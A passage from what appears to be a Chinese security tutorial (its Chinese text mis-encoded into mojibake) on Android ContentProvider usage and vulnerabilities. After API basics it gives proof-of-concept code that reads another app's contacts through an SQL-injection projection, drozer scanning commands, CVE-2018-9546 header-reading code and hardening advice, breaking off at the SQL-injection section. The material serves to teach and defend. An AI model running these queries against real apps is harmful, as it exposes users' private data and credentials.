class="line"><span class="built_in">text</span>/css</span><br><span class="line"><span class="built_in">text</span>/xml</span><br><span class="line"><span class="built_in">application</span>/pdf</span><br></pre></td></tr></table></figure><p>åˆ†ä¸ºç±»å‹å’Œå­ç±»å‹ï¼ŒAndroid éµå¾ªç±»ä¼¼çš„çº¦å®šæ¥å®šä¹‰MIMEç±»å‹ï¼Œæ¯ä¸ªå†…å®¹ç±»å‹çš„ Android MIME ç±»å‹æœ‰ä¸¤ç§å½¢å¼ï¼šå¤šæ¡è®°å½•ï¼ˆé›†åˆï¼‰å’Œå•æ¡è®°å½•ã€‚</p><ul><li><p>é›†åˆè®°å½•(dir):<br>vnd.android.cursor.<code>dir</code>/``è‡ªå®šä¹‰</p></li><li><p>å•æ¡è®°å½•(item)ï¼š</p><p>vnd.android.cursor.item/è‡ªå®šä¹‰</p></li></ul><p>vnd è¡¨ç¤ºè¿™äº›ç±»å‹å’Œå­ç±»å‹å…·æœ‰éæ ‡å‡†çš„ã€ä¾›åº”å•†ç‰¹å®šçš„å½¢å¼ã€‚Androidä¸­ç±»å‹å·²ç»å›ºå®šå¥½äº†ï¼Œä¸èƒ½æ›´æ”¹ï¼Œåªèƒ½åŒºåˆ«æ˜¯é›†åˆè¿˜æ˜¯å•æ¡å…·ä½“è®°å½•ï¼Œå­ç±»å‹å¯ä»¥æŒ‰ç…§æ ¼å¼è‡ªå·±å¡«å†™ï¼Œåœ¨ä½¿ç”¨ Intent æ—¶ï¼Œä¼šç”¨åˆ° MIMEï¼Œæ ¹æ® Mimetype æ‰“å¼€ç¬¦åˆæ¡ä»¶çš„æ´»åŠ¨ã€‚</p><h3 id="URIè§£æ">URIè§£æ</h3><p>è¿™é‡ŒURIä»£è¡¨è¦æ“ä½œçš„æ•°æ®ï¼Œæˆ‘ä»¬åœ¨å¯¹æ•°æ®è¿›è¡Œè·å–æ—¶éœ€è¦è§£æURIï¼ŒAndroidæä¾›äº†ä¸¤ä¸ªæ“ä½œURIçš„å·¥å…·ç±»ï¼š<strong>UriMatcher</strong> å’Œ <strong>ContentUris</strong></p><p><strong>UriMatcher</strong></p><ul><li>å°†éœ€è¦åŒ¹é…çš„Uriè·¯å¾„è¿›è¡Œæ³¨å†Œ</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å¸¸é‡UriMatcher.NO_MATCHè¡¨ç¤ºä¸åŒ¹é…ä»»ä½•è·¯å¾„çš„è¿”å›ç </span></span><br><span class="line"><span class="type">UriMatcher</span>  <span class="variable">sMatcher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UriMatcher</span>(UriMatcher.NO_MATCH);</span><br><span class="line"><span class="comment">//å¦‚æœmatch()æ–¹æ³•åŒ¹é…â€œcontent://com.wang.provider.myprovider/tablenameâ€è·¯å¾„ï¼Œè¿”å›åŒ¹é…ç ä¸º1</span></span><br><span class="line">sMatcher.addURI(<span class="string">&quot;content://com.wang.provider.myprovider&quot;</span>, <span class="string">&quot; tablename &quot;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="comment">//å¦‚æœmatch()æ–¹æ³•åŒ¹é…content://com.wang.provider.myprovider/tablename/11è·¯å¾„ï¼Œè¿”å›åŒ¹é…ç ä¸º2</span></span><br><span class="line">sMatcher.addURI(<span class="string">&quot;com.wang.provider.myprovider&quot;</span>, <span class="string">&quot;tablename/#&quot;</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>æ­¤å¤„é‡‡ç”¨ addURI æ³¨å†Œäº†ä¸¤ä¸ªéœ€è¦ç”¨åˆ°çš„ URIï¼›æ³¨æ„ï¼Œæ·»åŠ ç¬¬äºŒä¸ª URI æ—¶ï¼Œè·¯å¾„åé¢çš„ id é‡‡ç”¨äº†é€šé…ç¬¦å½¢å¼ â€œ#â€ï¼Œè¡¨ç¤ºåªè¦å‰é¢éƒ¨åˆ†éƒ½åŒ¹é…ä¸Šäº†å°± OK</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*:è¡¨ç¤ºåŒ¹é…ä»»æ„é•¿åº¦çš„ä»»æ„å­—ç¬¦</span><br><span class="line"><span class="comment">#:è¡¨ç¤ºåŒ¹é…ä»»æ„é•¿åº¦çš„æ•°å­—</span></span><br><span class="line">åŒ¹é…ä»»æ„è¡¨çš„å†…å®¹URIæ ¼å¼ï¼š</span><br><span class="line">contentï¼š<span class="regexp">//</span>com.example.app.provider/*</span><br><span class="line">åŒ¹é…tableè¡¨ä¸­<span class="number">1</span>ä»»æ„ä¸€è¡Œæ•°æ®çš„å†…å®¹URIæ ¼å¼ï¼š</span><br><span class="line">contentï¼š<span class="regexp">//</span>com.example.app.procider<span class="regexp">/table/</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><ul><li><p>æ³¨å†Œå®Œéœ€è¦åŒ¹é…çš„ Uri åï¼Œå¯ä»¥ä½¿ç”¨ sMatcher.match(Uri) æ–¹æ³•å¯¹è¾“å…¥çš„ Uri è¿›è¡ŒåŒ¹é…ï¼Œå¦‚æœåŒ¹é…å°±è¿”å›å¯¹åº”çš„åŒ¹é…ç ï¼ŒåŒ¹é…ç ä¸ºè°ƒç”¨ addURI() æ–¹æ³•æ—¶ä¼ å…¥çš„ç¬¬ä¸‰ä¸ªå‚æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (sMatcher.match(Uri.parse(<span class="string">&quot;content://com.zhang.provider.yourprovider/tablename/100&quot;</span>))) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      <span class="comment">//match 1, todo something</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span></span><br><span class="line">      <span class="comment">//match 2, todo something</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="comment">//match nothing, todo something</span></span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><strong>ContentUris</strong></p><p>ContentUrisç±»ç”¨äºæ“ä½œUriè·¯å¾„åé¢çš„IDéƒ¨åˆ†ï¼Œæœ‰ä¸¤ä¸ªå¸¸ç”¨æ–¹æ³•ï¼š</p><p>withAppendedId(Uri uri, long id)å’ŒparseId(Uri uri)</p><ul><li><p>withAppendedId(Uri uri, long id)ç”¨äºä¸ºè·¯å¾„åŠ ä¸ŠIDéƒ¨åˆ†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;content://com.wang.provider.myprovider/tablename&quot;</span>);</span><br><span class="line"><span class="comment">//ç”Ÿæˆçš„Uriä¸ºï¼šcontent://com.wang.provider.myprovider/tablename/10</span></span><br><span class="line"> <span class="type">Uri</span> <span class="variable">resultUri</span> <span class="operator">=</span> ContentUris.withAppendedId(uri, <span class="number">10</span>);</span><br></pre></td></tr></table></figure></li><li><p>parseId(Uri uri)åˆ™ä»è·¯å¾„ä¸­è·å–IDéƒ¨åˆ†:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;content://com.zhang.provider.myprovider/tablename/10&quot;</span>)</span><br><span class="line"><span class="comment">//è·å–çš„ç»“æœä¸ºï¼š10</span></span><br><span class="line"><span class="type">long</span> <span class="variable">personid</span> <span class="operator">=</span> ContentUris.parseId(uri);</span><br></pre></td></tr></table></figure></li></ul><h3 id="ContentProvideræ“ä½œæ•°æ®">ContentProvideræ“ä½œæ•°æ®</h3><p>å½“å¤–éƒ¨åº”ç”¨éœ€è¦å¯¹ContentProviderä¸­çš„æ•°æ®è¿›è¡Œæ·»åŠ ã€åˆ é™¤ã€ä¿®æ”¹åŠæŸ¥è¯¢æ“ä½œæ—¶ï¼Œå¯ä»¥ä½¿ç”¨ContentResolverç±»æ¥å®Œæˆï¼Œè¦è·å–ContentResolverå¯¹è±¡ï¼Œå¯ä»¥ä½¿ç”¨Activityæä¾›getContentResolver()</p><p>ContentResolverç±»æä¾›äº†ä¸ContentProviderç±»ç›¸åŒç­¾åçš„å››ä¸ªæ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Uri <span class="title function_">insert</span><span class="params">(Uri uri, ContentValues values)</span>ï¼Œå¾€ContentProvideræ·»åŠ æ•°æ®ï¼›</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">delete</span><span class="params">(Uri uri, String selection, String[] selectionArgs)</span>ï¼Œä»ContentProvideråˆ é™¤æ•°æ®ï¼›</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">update</span><span class="params">(Uri uri, ContentValues values, String selection, String[] selectionArgs)</span>ï¼Œæ›´æ–°ContentProviderä¸­çš„æ•°æ®ï¼›</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> Cursor <span class="title function_">query</span><span class="params">(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder)</span>ï¼Œä»ContentProviderä¸­è·å–æ•°æ®ï¼›</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ContentResolverå¯¹ContentProviderä¸­çš„æ•°æ®è¿›è¡Œæ“ä½œï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ContentResolver</span> <span class="variable">resolver</span> <span class="operator">=</span> getContentResolver();</span><br><span class="line"> <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;content://com.wang.provider.myprovider/tablename&quot;</span>);</span><br><span class="line"> <span class="comment">//æ·»åŠ ä¸€æ¡è®°å½•</span></span><br><span class="line"> <span class="type">ContentValues</span> <span class="variable">values</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContentValues</span>();</span><br><span class="line"> values.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;wang1&quot;</span>);</span><br><span class="line"> values.put(<span class="string">&quot;age&quot;</span>, <span class="number">28</span>);</span><br><span class="line"> resolver.insert(uri, values);</span><br><span class="line"> <span class="comment">//è·å–tablenameè¡¨ä¸­æ‰€æœ‰è®°å½•</span></span><br><span class="line"> <span class="type">Cursor</span> <span class="variable">cursor</span> <span class="operator">=</span> resolver.query(uri, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="string">&quot;tablename data&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>(cursor.moveToNext())&#123;</span><br><span class="line">   Log.i(<span class="string">&quot;ContentTest&quot;</span>, <span class="string">&quot;tablename_id=&quot;</span>+ cursor.getInt(<span class="number">0</span>)+ <span class="string">&quot;, name=&quot;</span>+ cursor.getString(<span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æŠŠidä¸º2çš„è®°å½•çš„nameå­—æ®µå€¼æ›´æ”¹æ–°ä¸ºzhang1</span></span><br><span class="line"><span class="type">ContentValues</span> <span class="variable">updateValues</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContentValues</span>();</span><br><span class="line">updateValues.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;zhang1&quot;</span>);</span><br><span class="line"><span class="type">Uri</span> <span class="variable">updateIdUri</span> <span class="operator">=</span> ContentUris.withAppendedId(uri, <span class="number">2</span>);</span><br><span class="line">resolver.update(updateIdUri, updateValues, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"><span class="comment">//åˆ é™¤idä¸º2çš„è®°å½•ï¼Œå³å­—æ®µage</span></span><br><span class="line"><span class="type">Uri</span> <span class="variable">deleteIdUri</span> <span class="operator">=</span> ContentUris.withAppendedId(uri, <span class="number">2</span>);</span><br><span class="line">resolver.delete(deleteIdUri, <span class="literal">null</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><h3 id="ç›‘å¬æ•°æ®å˜åŒ–">ç›‘å¬æ•°æ®å˜åŒ–</h3><p>å¦‚æœContentProviderçš„è®¿é—®è€…éœ€è¦çŸ¥é“æ•°æ®å‘ç”Ÿçš„å˜åŒ–ï¼Œå¯ä»¥åœ¨ContentProviderå‘ç”Ÿæ•°æ®å˜åŒ–æ—¶è°ƒç”¨getContentResolver().notifyChange(uri, null)æ¥é€šçŸ¥æ³¨å†Œåœ¨æ­¤URIä¸Šçš„è®¿é—®è€…ã€‚åªç»™å‡ºç±»ä¸­ç›‘å¬éƒ¨åˆ†çš„ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyProvider</span> <span class="keyword">extends</span> <span class="title class_">ContentProvider</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> Uri <span class="title function_">insert</span><span class="params">(Uri uri, ContentValues values)</span> &#123;</span><br><span class="line">     db.insert(<span class="string">&quot;tablename&quot;</span>, <span class="string">&quot;tablenameid&quot;</span>, values);</span><br><span class="line">      getContext().getContentResolver().notifyChange(uri, <span class="literal">null</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œè®¿é—®è€…å¿…é¡»ä½¿ç”¨ContentObserverå¯¹æ•°æ®ï¼ˆæ•°æ®é‡‡ç”¨uriæè¿°ï¼‰è¿›è¡Œç›‘å¬ï¼Œå½“ç›‘å¬åˆ°æ•°æ®å˜åŒ–é€šçŸ¥æ—¶ï¼Œç³»ç»Ÿå°±ä¼šè°ƒç”¨ContentObserverçš„onChange()æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">getContentResolver().registerContentObserver(Uri.parse(<span class="string">&quot;content://com.ljq.providers.personprovider/person&quot;</span>),</span><br><span class="line">        <span class="literal">true</span>, <span class="keyword">new</span> <span class="title class_">PersonObserver</span>(<span class="keyword">new</span> <span class="title class_">Handler</span>()));</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PersonObserver</span> <span class="keyword">extends</span> <span class="title class_">ContentObserver</span>&#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="title function_">PersonObserver</span><span class="params">(Handler handler)</span> &#123;</span><br><span class="line">       <span class="built_in">super</span>(handler);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onChange</span><span class="params">(<span class="type">boolean</span> selfChange)</span> &#123;</span><br><span class="line">        <span class="comment">//to do something</span></span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h3 id="Content-Provideræ¼æ´åŸç†åˆ†æ">Content Provideræ¼æ´åŸç†åˆ†æ</h3><ul><li>ä¿¡æ¯æ³„éœ²</li><li>SQLæ³¨å…¥</li><li>ç›®å½•éå†</li></ul><p>Content Provideræ¼æ´çš„å±å®³ï¼š</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Androidä¸­Content </span>Providerèµ·åˆ°åœ¨ä¸åŒçš„è¿›ç¨‹APPä¹‹é—´å®ç°å…±äº«æ•°æ®çš„ä½œç”¨ï¼Œé€šè¿‡<span class="keyword">Binderè¿›ç¨‹é—´é€šä¿¡æœºåˆ¶ä»¥åŠåŒ¿åå…±äº«å†…å­˜æœºåˆ¶æ¥å®ç°ï¼Œä½†æ˜¯è€ƒè™‘åˆ°æ•°æ®çš„å®‰å…¨æ€§ï¼Œæˆ‘ä»¬éœ€è¦è®¾ç½®ä¸€å®šçš„ä¿æŠ¤æƒé™ã€‚</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">Binderè¿›ç¨‹é—´é€šä¿¡æœºåˆ¶çªç ´äº†ä»¥åº”ç”¨ç¨‹åºä¸ºè¾¹ç•Œçš„æƒé™æ§åˆ¶ï¼Œæ˜¯å®‰å…¨å¯æ§çš„ï¼Œæ•°æ®çš„è®¿é—®æ¥å£ç”±æ•°æ®çš„æ‰€æœ‰è€…æ¥æä¾›ï¼Œæ•°æ®æä¾›æ–¹å®ç°å®‰å…¨æ§åˆ¶ï¼Œå†³å®šæ•°æ®çš„è¯»å†™æ“ä½œ</span></span><br><span class="line"><span class="keyword"></span>è€Œcontent Providerç»„ä»¶æœ¬èº«æä¾›äº†è¯»å–æƒé™æ§åˆ¶ï¼Œè¿™å¯¼è‡´åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­å°±ä¼šå­˜åœ¨ä¸€äº›æ¼æ´</span><br></pre></td></tr></table></figure><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">åˆ—å‡ºuri</span><br><span class="line"><span class="keyword">run</span> <span class="keyword">app</span>.provider.finduri åŒ…å</span><br><span class="line"></span><br><span class="line">è¾“å‡ºæ•°æ®å†…å®¹</span><br><span class="line">adb <span class="keyword">shell</span> content <span class="keyword">query</span> --uri + å…·ä½“uriè·¯å¾„  æˆ–è€… <span class="keyword">run</span> <span class="keyword">app</span>.provider.<span class="keyword">query</span> <span class="string">&quot;å…·ä½“uri&quot;</span></span><br></pre></td></tr></table></figure><h4 id="ä¿¡æ¯æ³„éœ²">ä¿¡æ¯æ³„éœ²</h4><p><strong>åŸç†ä»‹ç»</strong></p><p>content URIæ˜¯ä¸€ä¸ªæ ‡å¿—providerä¸­çš„æ•°æ®çš„URIã€‚Content URIä¸­åŒ…å«äº†æ•´ä¸ªproviderçš„ä»¥ç¬¦å·è¡¨ç¤ºçš„åå­—(å®ƒçš„authority)å’ŒæŒ‡å‘ä¸€ä¸ªè¡¨çš„åå­—(ä¸€ä¸ªè·¯å¾„)ã€‚å½“ä½ è°ƒç”¨ä¸€ä¸ªå®¢æˆ·ç«¯çš„æ–¹æ³•æ¥æ“ä½œä¸€ä¸ªproviderä¸­çš„ä¸€ä¸ªè¡¨ï¼ŒæŒ‡å‘è¡¨çš„contentURIæ˜¯å‚æ•°ä¹‹ä¸€ï¼Œå¦‚æœå¯¹ContentProviderçš„æƒé™æ²¡æœ‰åšå¥½æ§åˆ¶ï¼Œå°±æœ‰å¯èƒ½å¯¼è‡´æ¶æ„çš„ç¨‹åºé€šè¿‡è¿™ç§æ–¹å¼è¯»å–APPçš„æ•æ„Ÿæ•°æ®ã€‚</p><p><strong>æ¼æ´å¤ç°</strong></p><p>æ¡ˆä¾‹ï¼š<strong>ç››å¤§æœ‰ä½ Androidå­˜åœ¨ä¿¡æ¯æ³„éœ²æ¼æ´</strong></p><p><strong>ç›®æ ‡ä»£ç </strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">provider</span> <span class="attr">android:name</span>=<span class="string">&quot;.providers.YouNiProvider&quot;</span> </span></span><br><span class="line"><span class="tag">          <span class="attr">android:process</span>=<span class="string">&quot;com.snda.youni.mms&quot;</span>   <span class="attr">android:authorities</span>=<span class="string">&quot;com.snda.youni.providers.DataStructs&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p><strong>æ”»å‡»ä»£ç </strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">getyouni</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    ContentResolver contentresolver=getContentResolver();</span><br><span class="line">    String[] projection=&#123;<span class="string">&quot;* from contacts--&quot;</span>&#125;;</span><br><span class="line">    <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span>Uri.parse(<span class="string">&quot;content://com.snda.youni.providers.DataStructs/message_ex&quot;</span>);</span><br><span class="line">    Cursor cursor=contentresolver.query(uri.projection,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">    String text=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span>(cursor.moveToNext())&#123;</span><br><span class="line">        text+=cursor.getString(cursor.getColumnIndex(<span class="string">&quot;display_name&quot;</span>))+<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Log.i(<span class="string">&quot;TEST&quot;</span>,text);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ä»£ç åˆ†æ:</strong></p><p>æˆ‘ä»¬å¯ä»¥åˆ†æç›®æ ‡ç¨‹åºçš„providerçš„è¿›ç¨‹åå’Œæˆæƒçš„çš„URIï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®æˆæƒçš„URIæ¥æ„å»ºä¸€ä¸ªURIï¼Œç„¶åé€šè¿‡contentresolverå»è¯»å–é‡Œé¢çš„çš„åˆ—è¡¨åä¿¡æ¯ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è·å–APPä¸­çš„éšç§æ•°æ®ä¿¡æ¯ã€‚</p><p>æ¡ˆä¾‹2ï¼šsieve.apk</p><ul><li><p>å…ˆæ‰«æå¯è®¿é—®çš„URI<br><code>run scanner.provider.finduris -a &lt;åŒ…å&gt;</code><br><img src="/posts/f416437f.htm/image-20240923165949228.png" alt="image-20240923165949228"></p></li><li><p>å¯ä»¥å¯¹æ•æ„Ÿä¿¡æ¯è¿›è¡Œè¯»å–<br><img src="/posts/f416437f.htm/image-20240923170729848.png" alt="image-20240923170729848"></p></li><li><p>å¯ä»¥çœ‹åˆ°æœ‰è´¦å·å¯†ç ä¹‹ç±»çš„æ•°æ®</p></li></ul><p>æ¡ˆä¾‹3ï¼š<a href="https://mabin004.github.io/2019/04/15/Android-Download-Provider%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2018-9546: Download Provideræ–‡ä»¶å¤´ä¿¡æ¯æ³„éœ²</a></p><p><strong>æ¼æ´æè¿°</strong></p><p>Download Providerè¿è¡Œappè·å–ä¸‹è½½çš„httpè¯·æ±‚å¤´ï¼Œä½†ç†è®ºä¸ŠAPPåªèƒ½è®¿é—®è‡ªå·±ä¸‹è½½çš„æ–‡ä»¶çš„httpè¯·æ±‚å¤´ï¼Œä½†Download Provideræ²¡æœ‰åšå¥½æƒé™é…ç½®ï¼Œå¯¼è‡´headså¯ä»¥è¢«ä»»æ„è¯»å–ã€‚headerä¸­ä¼šä¿å­˜ä¸€äº›æ•æ„Ÿæ•°æ®ï¼Œä¾‹å¦‚cookieç­‰ã€‚</p><p><strong>ç›®æ ‡ä»£ç </strong></p><p>è¯»å–headerçš„URIä¸ºï¼š<code>content://download/mydownloads/download_id/headers</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;content://download/mydownloads/1493/headers&quot;</span>);</span><br><span class="line"><span class="type">Cursor</span> <span class="variable">cur</span> <span class="operator">=</span> res.query(uri, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (cur != <span class="literal">null</span> &amp;&amp; cur.getCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(LOG_SEPARATOR);</span><br><span class="line">        sb.append(<span class="string">&quot;HEADERS FOR DOWNLOAD ID &quot;</span>).append(id).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> (cur.moveToNext()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">rowHeader</span> <span class="operator">=</span> cur.getString(cur.getColumnIndex(<span class="string">&quot;header&quot;</span>));</span><br><span class="line">            <span class="type">String</span> <span class="variable">rowValue</span> <span class="operator">=</span> cur.getString(cur.getColumnIndex(<span class="string">&quot;value&quot;</span>));</span><br><span class="line">            sb.append(rowHeader).append(<span class="string">&quot;: &quot;</span>).append(rowValue).append(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        log(sb.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (cur != <span class="literal">null</span>)</span><br><span class="line">        cur.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å®‰å…¨é˜²æŠ¤</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.minSdkVersionä¸ä½äº<span class="number">9</span></span><br><span class="line"><span class="number">2</span>.ä¸å‘å¤–éƒ¨appæä¾›æ•°æ®çš„ç§æœ‰<span class="attribute">content</span> provideræ˜¾ç¤ºè®¾ç½®exported=â€falseâ€ï¼Œé¿å…ç»„ä»¶æš´éœ²(ç¼–è¯‘apiå°äº<span class="number">17</span>æ—¶æ›´åº”æ³¨æ„æ­¤ç‚¹)</span><br><span class="line"><span class="number">3</span>.å†…éƒ¨appé€šè¿‡<span class="attribute">content</span> providäº¤æ¢æ•°æ®æ—¶ï¼Œè®¾ç½®protectionLevel=â€signatureâ€éªŒè¯ç­¾å</span><br><span class="line"><span class="number">4</span>.å…¬å¼€çš„<span class="attribute">content</span> providerç¡®ä¿ä¸å­˜å‚¨æ•æ„Ÿæ•°æ®</span><br><span class="line"> </span><br><span class="line">é’ˆå¯¹æƒé™ä¿æŠ¤ç»•è¿‡é˜²å¾¡æªæ–½ï¼š</span><br><span class="line"><span class="number">1</span>.ä½¿ç”¨Context<span class="selector-class">.checkCallingPermission</span>()å’ŒContext<span class="selector-class">.enforceCallingPermission</span>()æ¥ç¡®ä¿è°ƒç”¨è€…æ‹¥æœ‰ç›¸åº”çš„æƒé™ï¼Œé˜²æ­¢ä¸²è°‹æ”»å‡»(confused deputy)ã€‚</span><br><span class="line"><span class="number">2</span>.å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‡½æ•°ï¼Œè·å–åº”ç”¨çš„permissionä¿æŠ¤çº§åˆ«æ˜¯å¦ä¸ç³»ç»Ÿä¸­å·²å®šä¹‰çš„permissionä¿æŠ¤çº§åˆ«ä¸€è‡´ã€‚å¦‚æœä¸ä¸€è‡´ï¼Œåˆ™æŠ›å‡ºå¼‚å¸¸ã€‚</span><br></pre></td></tr></table></figure><h4 id="SQLæ³¨å…¥æ¼æ´">SQLæ³¨å…¥æ¼æ´</h4><p><strong>åŸç†ä»‹ç»</strong></p><p>â€‹        å¯¹Content 